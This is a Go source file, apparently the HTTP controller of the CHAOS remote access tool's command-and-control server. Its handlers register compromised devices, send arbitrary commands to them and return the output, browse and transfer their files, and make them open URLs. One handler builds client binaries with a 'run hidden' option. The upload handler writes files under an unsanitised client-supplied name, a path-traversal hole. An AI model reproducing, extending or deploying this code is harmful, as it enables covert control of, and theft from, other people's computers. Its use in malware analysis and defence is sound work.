package http

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"github.com/gin-gonic/gin"
	"github.com/gin-gonic/gin/binding"
	"github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/entities"
	"github.com/tiagorlampert/CHAOS/internal/utils"
	"github.com/tiagorlampert/CHAOS/internal/utils/constants"
	"github.com/tiagorlampert/CHAOS/internal/utils/network"
	"github.com/tiagorlampert/CHAOS/internal/utils/system"
	"github.com/tiagorlampert/CHAOS/presentation/http/request"
	"github.com/tiagorlampert/CHAOS/services/client"
	"github.com/tiagorlampert/CHAOS/services/payload"
	"github.com/tiagorlampert/CHAOS/services/user"
	"net/http"
	"net/url"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

func (h *httpController) noRouteHandler(c *gin.Context) {
	c.Redirect(http.StatusMovedPermanently, "/")
	c.Abort()
	return
}

func (h *httpController) healthHandler(c *gin.Context) {
	c.Status(http.StatusOK)
	return
}

func (h *httpController) loginHandler(c *gin.Context) {
	c.HTML(http.StatusOK, "login.html", gin.H{})
	return
}

func (h *httpController) getSettingsHandler(c *gin.Context) {
	auth, err := h.AuthService.GetAuthConfig()
	if err != nil {
		h.Logger.Error(err)
		c.Status(http.StatusInternalServerError)
		return
	}
	c.HTML(http.StatusOK, "settings.html", gin.H{
		"SecretKey": auth.SecretKey,
	})
	return
}

func (h *httpController) refreshTokenHandler(c *gin.Context) {
	secret, err := h.AuthService.RefreshSecret()
	if err != nil {
		h.Logger.Error(err.Error())
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	c.String(http.StatusOK, secret)
	return
}

func (h *httpController) getUserProfileHandler(c *gin.Context) {
	user, _ := c.Get("user")
	c.HTML(http.StatusOK, "profile.html", gin.H{
		"Username": user.(*entities.User).Username,
	})
	return
}

func (h *httpController) createUserHandler(c *gin.Context) {
	var body entities.User
	if err := c.ShouldBind(&body); err != nil {
		h.Logger.Warning(err)
		c.Status(http.StatusBadRequest)
		return
	}

	if err := h.UserService.Insert(body); err != nil {
		if err == user.ErrUserAlreadyExist {
			c.Status(http.StatusNotModified)
			return
		}
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	c.Status(http.StatusOK)
	return
}

func (h *httpController) updateUserPasswordHandler(c *gin.Context) {
	var body request.UpdateUserPasswordRequestForm
	if err := c.ShouldBind(&body); err != nil {
		h.Logger.Warning(err)
		c.Status(http.StatusBadRequest)
		return
	}

	if err := h.UserService.UpdatePassword(user.UpdateUserPasswordInput{
		Username:    body.Username,
		OldPassword: body.OldPassword,
		NewPassword: body.NewPassword,
	}); err != nil {
		if errors.Is(err, user.ErrInvalidPassword) {
			c.JSON(http.StatusUnauthorized, gin.H{"error": err.Error()})
			return
		}
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	c.Status(http.StatusOK)
	return
}

func (h *httpController) setDeviceHandler(c *gin.Context) {
	var body entities.Device
	if err := c.ShouldBindJSON(&body); err != nil {
		h.Logger.Warning(err)
		c.Status(http.StatusBadRequest)
		return
	}

	fields := logrus.Fields{
		`hostname`:   body.Hostname,
		`username`:   body.UserID,
		`ipAddress`:  body.LocalIPAddress,
		`macAddress`: body.MacAddress,
		`os`:         body.OSName,
		`arch`:       body.OSArch,
	}

	if err := h.DeviceService.Insert(body); err != nil {
		h.Logger.WithFields(fields).Error(`Failed to persist device: `, err.Error())
		c.Status(http.StatusInternalServerError)
		return
	}

	h.Logger.WithFields(fields).Info(`Device available`)
	c.Status(http.StatusOK)
	return
}

func (h *httpController) getDevicesHandler(c *gin.Context) {
	devices, err := h.DeviceService.FindAll()
	if err != nil {
		h.Logger.Error(`Failed to get available devices`)
		c.Status(http.StatusInternalServerError)
		return
	}

	c.HTML(http.StatusOK, "devices.html", gin.H{
		"Devices": devices,
	})
	return
}

func (h *httpController) sendCommandHandler(c *gin.Context) {
	var form request.SendCommandRequestForm
	if err := c.ShouldBind(&form); err != nil {
		c.String(http.StatusBadRequest, err.Error())
		return
	}
	if len(strings.TrimSpace(form.Command)) == 0 {
		c.String(http.StatusOK, constants.NoContent)
		return
	}

	ctxWithTimeout, cancel := context.WithTimeout(c, 15*time.Second)
	defer cancel()

	payload, err := h.ClientService.SendCommand(ctxWithTimeout, client.SendCommandInput{
		MacAddress: form.Address,
		Request:    form.Command,
	})
	if err != nil {
		c.String(http.StatusInternalServerError, err.Error())
		return
	}
	c.String(http.StatusOK, payload.Response)
	return
}

func (h *httpController) getCommandHandler(c *gin.Context) {
	address := c.Query("address")
	decoded, err := utils.DecodeBase64(address)
	if err != nil {
		c.String(http.StatusBadRequest, err.Error())
		return
	}
	req, found := h.PayloadService.Get(decoded)
	if found {
		c.JSON(http.StatusOK, req)
		return
	}
	c.Status(http.StatusNoContent)
	return
}

func (h *httpController) respondCommandHandler(c *gin.Context) {
	var body request.RespondCommandRequestBody
	if err := c.BindJSON(&body); err != nil {
		c.String(http.StatusBadRequest, err.Error())
		return
	}
	h.PayloadService.Set(body.MacAddress, &payload.Data{
		Response:    body.Response,
		HasError:    body.HasError,
		HasResponse: true,
	})
	c.Status(http.StatusOK)
}

func (h *httpController) generateBinaryGetHandler(c *gin.Context) {
	c.HTML(http.StatusOK, "generate.html", gin.H{
		"Address":  network.GetLocalIP(),
		"Port":     strings.ReplaceAll(h.Configuration.Server.Port, ":", ""),
		"OSTarget": system.OSTargetMap,
	})
	return
}

func (h *httpController) generateBinaryPostHandler(c *gin.Context) {
	var req request.GenerateClientRequestForm
	if err := c.ShouldBindWith(&req, binding.Form); err != nil {
		c.String(http.StatusBadRequest, err.Error())
		return
	}
	osTarget, err := strconv.Atoi(req.OSTarget)
	if err != nil {
		c.String(http.StatusBadRequest, err.Error())
		return
	}

	binary, err := h.ClientService.BuildClient(client.BuildClientBinaryInput{
		ServerAddress: req.Address,
		ServerPort:    req.Port,
		OSTarget:      system.OSTargetIntMap[osTarget],
		Filename:      req.Filename,
		RunHidden:     utils.ParseCheckboxBoolean(req.RunHidden),
	})
	if err != nil {
		h.Logger.Error(err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	c.String(http.StatusOK, binary)
	return
}

func (h *httpController) shellHandler(c *gin.Context) {
	c.HTML(http.StatusOK, "command.html", gin.H{})
	return
}

func (h *httpController) downloadFileHandler(c *gin.Context) {
	fileName := c.Param("filename")
	targetPath := filepath.Join(constants.TempDirectory, fileName)
	if !strings.HasPrefix(filepath.Clean(targetPath), constants.TempDirectory) {
		c.String(403, "Forbidden")
		return
	}

	c.Header("Content-Transfer-Encoding", "binary")
	c.Header("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, fileName))
	c.File(targetPath)
}

func (h *httpController) fileExplorerHandler(c *gin.Context) {
	var req request.FileExplorerRequestForm
	if err := c.ShouldBind(&req); err != nil {
		c.String(http.StatusBadRequest, err.Error())
		return
	}
	decodedPath, err := utils.DecodeBase64(req.Path)
	if err != nil {
		c.String(http.StatusBadRequest, err.Error())
		return
	}
	path, err := url.QueryUnescape(decodedPath)
	if err != nil {
		c.String(http.StatusBadRequest, err.Error())
		return
	}

	ctxWithTimeout, cancel := context.WithTimeout(c, 15*time.Second)
	defer cancel()

	command, err := h.ClientService.SendCommand(ctxWithTimeout, client.SendCommandInput{
		MacAddress: req.Address,
		Request:    fmt.Sprint("explore ", path),
	})
	if err != nil {
		c.HTML(http.StatusOK, "explorer.html", gin.H{"error": fmt.Sprintf("Error: %s", err.Error())})
		return
	}

	var fileExplorer entities.FileExplorer
	if err := json.Unmarshal(utils.StringToByte(command.Response), &fileExplorer); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	c.HTML(http.StatusOK, "explorer.html", gin.H{
		"FileExplorer": fileExplorer,
	})
	return
}

func (h *httpController) uploadFileHandler(c *gin.Context) {
	file, err := c.FormFile("file")
	if err != nil {
		c.String(http.StatusBadRequest, err.Error())
		return
	}
	if err := c.SaveUploadedFile(file, fmt.Sprint(constants.TempDirectory, file.Filename)); err != nil {
		c.String(http.StatusInternalServerError, err.Error())
		return
	}
	c.String(http.StatusOK, file.Filename)
}

func (h *httpController) openUrlHandler(c *gin.Context) {
	var req request.OpenUrlRequestForm
	if err := c.ShouldBindWith(&req, binding.Form); err != nil {
		c.String(http.StatusBadRequest, err.Error())
		return
	}
	if err := h.UrlService.OpenUrl(c.Request.Context(), req.Address, req.URL); err != nil {
		c.String(http.StatusInternalServerError, err.Error())
		return
	}
	c.Status(http.StatusOK)
	return
}
